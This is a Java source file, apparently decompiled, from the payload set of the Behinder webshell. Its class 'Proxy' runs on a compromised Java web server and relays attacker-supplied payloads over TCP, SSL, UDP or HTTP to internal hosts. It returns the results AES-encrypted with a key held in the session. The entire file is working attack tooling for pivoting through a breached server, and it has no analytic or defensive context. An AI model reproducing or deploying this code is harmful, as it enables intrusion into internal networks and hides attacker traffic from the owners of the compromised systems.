package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.ConnectException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.nio.channels.SocketChannel;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Random;
import java.util.zip.GZIPInputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;

public class Proxy {
   public static String target;
   public static String type;
   public static String payloadBody;
   private Object Request;
   private Object Response;
   private Object Session;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var21 = false;

      Method write;
      Object headers;
      label181: {
         try {
            var21 = true;
            this.fillContext(obj);
            byte[] resData;
            if (type.equals("TCP")) {
               try {
                  resData = this.doTCP();
                  result.put("msg", base64encode(resData));
                  result.put("status", "success");
                  var21 = false;
               } catch (ConnectException var28) {
                  result.put("msg", "closed");
                  result.put("status", "fail");
                  var21 = false;
               } catch (SocketTimeoutException var29) {
                  result.put("msg", "timeout");
                  result.put("status", "fail");
                  var21 = false;
               }
            } else if (type.equals("SSL")) {
               try {
                  resData = this.doSSL();
                  result.put("msg", base64encode(resData));
                  result.put("status", "success");
                  var21 = false;
               } catch (ConnectException var26) {
                  result.put("msg", "closed");
                  result.put("status", "fail");
                  var21 = false;
               } catch (SocketTimeoutException var27) {
                  result.put("msg", "timeout");
                  result.put("status", "fail");
                  var21 = false;
               }
            } else if (type.equals("UDP")) {
               try {
                  resData = this.doUDP();
                  result.put("msg", base64encode(resData));
                  result.put("status", "success");
                  var21 = false;
               } catch (SocketTimeoutException var25) {
                  result.put("msg", "closed");
                  result.put("status", "fail");
                  var21 = false;
               }
            } else if (!type.equals("HTTP")) {
               var21 = false;
            } else {
               headers = (Map)this.sessionGetAttribute(this.Session, target);
               if (headers == null) {
                  headers = new HashMap();
               }

               Map transResultObj = this.sendPostRequestBinary(target, (Map)headers, this.base64decode(payloadBody));
               Map responseHeader = (Map)transResultObj.get("header");
               Iterator var6 = responseHeader.keySet().iterator();

               while(var6.hasNext()) {
                  String headerName = (String)var6.next();
                  if (headerName != null && headerName.equalsIgnoreCase("Set-Cookie")) {
                     ((Map)headers).put("Cookie", responseHeader.get(headerName));
                  }
               }

               if (((String)responseHeader.get("status")).equals("200")) {
                  Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, transResultObj.get("data"));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
                  var21 = false;
               } else {
                  var21 = false;
               }
            }
            break label181;
         } catch (Exception var30) {
            var30.printStackTrace();
            result.put("msg", "exception");
            result.put("status", "fail");
            var21 = false;
         } finally {
            if (var21) {
               try {
                  Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               } catch (Exception var22) {
               }

            }
         }

         try {
            headers = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = headers.getClass().getMethod("write", byte[].class);
            write.invoke(headers, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            headers.getClass().getMethod("flush").invoke(headers);
            headers.getClass().getMethod("close").invoke(headers);
         } catch (Exception var23) {
         }

         return true;
      }

      try {
         headers = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         write = headers.getClass().getMethod("write", byte[].class);
         write.invoke(headers, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         headers.getClass().getMethod("flush").invoke(headers);
         headers.getClass().getMethod("close").invoke(headers);
      } catch (Exception var24) {
      }

      return true;
   }

   private byte[] doTCP() throws Exception {
      SocketChannel socketChannel = SocketChannel.open();
      socketChannel.connect(new InetSocketAddress(target.split(":")[0], Integer.parseInt(target.split(":")[1])));
      socketChannel.socket().setSoTimeout(6000);
      byte[] payload = this.base64decode(payloadBody);
      socketChannel.socket().getOutputStream().write(payload);
      socketChannel.socket().getOutputStream().flush();
      byte[] buf = new byte[10240];
      int length = socketChannel.socket().getInputStream().read(buf);
      if (length < 0) {
         throw new SocketTimeoutException("timeout");
      } else {
         return Arrays.copyOfRange(buf, 0, length);
      }
   }

   private byte[] doSSL() {
      String host = target.split(":")[0];
      int port = Integer.parseInt(target.split(":")[1]);

      try {
         SSLSocketFactory factory = (SSLSocketFactory)SSLSocketFactory.getDefault();
         SSLSocket socket = (SSLSocket)factory.createSocket(host, port);
         socket.startHandshake();
         DataOutputStream out = new DataOutputStream(socket.getOutputStream());
         out.write(this.base64decode(payloadBody));
         out.flush();
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
         byte[] buff = new byte[1024];
         DataInputStream in = new DataInputStream(socket.getInputStream());

         for(int length = in.read(buff); length > 0; length = in.read(buff)) {
            bos.write(buff, 0, length);
         }

         out.close();
         in.close();
         bos.close();
         socket.close();
         return bos.toByteArray();
      } catch (Exception var10) {
         var10.printStackTrace();
         return null;
      }
   }

   private byte[] doUDP() throws Exception {
      byte[] payload = this.base64decode(payloadBody);
      DatagramSocket udpSocket = new DatagramSocket();
      udpSocket.setSoTimeout(6000);
      DatagramPacket sendPacket = new DatagramPacket(payload, payload.length, new InetSocketAddress(target.split(":")[0], Integer.parseInt(target.split(":")[1])));
      udpSocket.send(sendPacket);
      byte[] buf = new byte[1024];
      DatagramPacket receivePacket = new DatagramPacket(buf, buf.length);
      udpSocket.receive(receivePacket);
      int length = receivePacket.getLength();
      if (length < 0) {
         throw new Exception("error");
      } else {
         return Arrays.copyOfRange(buf, 0, length);
      }
   }

   private byte[] readLine(InputStream in) throws IOException {
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      boolean var3 = true;

      int c;
      while((c = in.read()) != -1 && c != 10 && c != 13) {
         bos.write(c);
      }

      return bos.toByteArray();
   }

   private void setHeader(String key, String value) {
      try {
         this.Response.getClass().getMethod("setHeader", String.class, String.class).invoke(this.Response, key, value);
      } catch (Exception var4) {
      }

   }

   private Map sendPostRequestBinary(String urlPath, Map header, byte[] data) throws Exception {
      Map result = new HashMap();
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      URL url = new URL(urlPath);
      HttpURLConnection conn = (HttpURLConnection)url.openConnection();
      conn.setConnectTimeout(15000);
      conn.setUseCaches(false);
      conn.setRequestMethod("POST");
      int length;
      if (header != null) {
         Object[] keys = header.keySet().toArray();
         Arrays.sort(keys);
         Object[] var9 = keys;
         int var10 = keys.length;

         for(length = 0; length < var10; ++length) {
            Object key = var9[length];
            conn.setRequestProperty(key.toString(), (String)header.get(key));
         }
      }

      conn.setDoOutput(true);
      conn.setDoInput(true);
      conn.setUseCaches(false);
      OutputStream outwritestream = conn.getOutputStream();
      outwritestream.write(data);
      outwritestream.flush();
      outwritestream.close();
      if (conn.getResponseCode() == 200) {
         String encoding = conn.getContentEncoding();
         DataInputStream din;
         byte[] buffer;
         boolean var24;
         if (encoding != null) {
            if (encoding != null && encoding.equals("gzip")) {
               din = null;
               GZIPInputStream gZIPInputStream = new GZIPInputStream(conn.getInputStream());
               din = new DataInputStream(gZIPInputStream);
               buffer = new byte[1024];
               boolean var13 = false;

               while((length = din.read(buffer)) != -1) {
                  bos.write(buffer, 0, length);
               }
            } else {
               din = new DataInputStream(conn.getInputStream());
               buffer = new byte[1024];
               var24 = false;

               while((length = din.read(buffer)) != -1) {
                  bos.write(buffer, 0, length);
               }
            }
         } else {
            din = new DataInputStream(conn.getInputStream());
            buffer = new byte[1024];
            var24 = false;

            while((length = din.read(buffer)) != -1) {
               bos.write(buffer, 0, length);
            }
         }

         byte[] resData = bos.toByteArray();
         result.put("data", resData);
         Map responseHeader = new HashMap();
         Iterator var28 = conn.getHeaderFields().keySet().iterator();

         while(var28.hasNext()) {
            String key = (String)var28.next();
            responseHeader.put(key, conn.getHeaderField(key));
         }

         responseHeader.put("status", conn.getResponseCode() + "");
         result.put("header", responseHeader);
         return result;
      } else {
         DataInputStream din = new DataInputStream(conn.getErrorStream());
         byte[] buffer = new byte[1024];
         boolean var21 = false;

         while((length = din.read(buffer)) != -1) {
            bos.write(buffer, 0, length);
         }

         throw new Exception(new String(bos.toByteArray(), "GBK"));
      }
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private byte[] base64decode(String text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result = null;

      try {
         Class Base64;
         Object Decoder;
         if (version.compareTo("1.9") >= 0) {
            this.getClass();
            Base64 = Class.forName("java.util.Base64");
            Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text));
         } else {
            this.getClass();
            Base64 = Class.forName("sun.misc.BASE64Decoder");
            Decoder = Base64.newInstance();
            result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text));
         }
      } catch (Exception var6) {
      }

      return result;
   }

   private Object sessionGetAttribute(Object session, String key) {
      Object result = null;

      try {
         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
      } catch (Exception var5) {
         var5.printStackTrace();
      }

      return result;
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
         var5.printStackTrace();
      }

   }

   private Enumeration getHeaderNames(Object request) {
      Enumeration result = null;

      try {
         result = (Enumeration)request.getClass().getMethod("getHeaderNames").invoke(request);
      } catch (Exception var4) {
      }

      return result;
   }

   private String getHeader(Object request, String headerName) {
      String result = null;

      try {
         result = request.getClass().getMethod("getHeader", String.class).invoke(request, headerName).toString();
      } catch (Exception var5) {
      }

      return result;
   }

   private static String base64encode(byte[] content) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content);
      } else {
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, content);
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] getMagic() throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
      Random random = new Random();
      byte[] buf = new byte[magicNum];

      for(int i = 0; i < buf.length; ++i) {
         buf[i] = (byte)random.nextInt(256);
      }

      return buf;
   }
}
